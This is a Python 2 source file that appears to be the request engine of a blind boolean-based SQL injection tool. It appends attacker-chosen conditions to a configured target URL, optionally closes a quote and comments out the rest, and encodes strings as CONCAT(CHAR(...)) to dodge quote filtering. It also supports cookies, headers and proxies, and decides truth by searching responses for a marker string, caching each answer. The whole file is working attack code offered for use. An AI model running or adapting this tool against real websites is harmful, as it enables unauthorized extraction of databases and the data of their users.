import os
import threading

import requests
# from bs4 import BeautifulSoup

import config

data = {}

lock = threading.Lock()
print_lock = threading.Lock()

def println(string):
    print_lock.acquire()
    print string
    print_lock.release()

def add_to_cache(string, value):
    file = open("cache.txt", "a")
    file.write(string + "::::" + str(value) + "\n")
    file.close()

def read_cache():
    global data
    if (os.path.exists("cache.txt")):
        file = open("cache.txt", "r")
        lines = file.readlines()
        file.close()

        for line in lines:
            line = line.strip()
            items = line.split("::::")
            string = items[0]
            value = items[1]

            data[string] = (value == "True")
    else:
        data = {}

def char_array(string):
    content = ""
    for num, char in enumerate(string):
        if num == 0:
            content = "CHAR(" + str(ord(char)) + ")"
        else:
            content += ",CHAR(" + str(ord(char)) + ")"

    return "CONCAT(" + content + ")"

def check_truth(injection_string):
    global data
    url = "%s and (%s)" % (config.injection_url, injection_string)

    args = {}
    if config.cookies:
        from Cookie import SimpleCookie

        cookie = SimpleCookie()
        cookie.load(config.cookies)
        cookies = {}
        for key, morsel in cookie.items():
            cookies[key] = morsel.value


        args["cookies"] = cookies
    if config.headers:
        args["headers"] = config.headers
    if config.proxies:
        args["proxies"] = config.proxies

    if config.parameter_needs_quote:
        url = "%s' and (%s)-- j" % (config.injection_url, injection_string)

    if injection_string in data:
        return data[injection_string]

    response = requests.get(url, **args)

    try:
        if response.status_code == 200:
            content = response.content
            if config.truth_string in content:
                lock.acquire()
                data[injection_string] = True
                add_to_cache(injection_string, True)
                lock.release()
                return True
    except:
        raise Exception("Error occurred while requesting the url '''%s'''!" % url)

    lock.acquire()
    data[injection_string] = False
    add_to_cache(injection_string, False)
    lock.release()
    return False